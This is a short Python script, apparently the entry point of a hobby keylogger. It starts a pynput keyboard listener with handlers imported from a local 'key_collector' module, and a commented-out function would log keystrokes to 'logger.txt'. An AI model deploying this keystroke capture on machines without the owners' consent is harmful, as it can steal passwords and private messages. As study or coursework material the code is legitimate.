from key_collector import on_press, on_release, write_file, log_dict, pressed_keys
from pynput.keyboard import Key, Listener

# def KeyLogger(listener):
#     # on_press(listener)
#     # write_file(pressed_keys)
#     print('baruch')   
#     with open('logger.txt', 'a') as f:
#         for key, value in log_dict.items():
#             f.write(key + '\n' + '  ' + value + '\n')
#     # on_release(listener)

# KeyLogger(listener)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()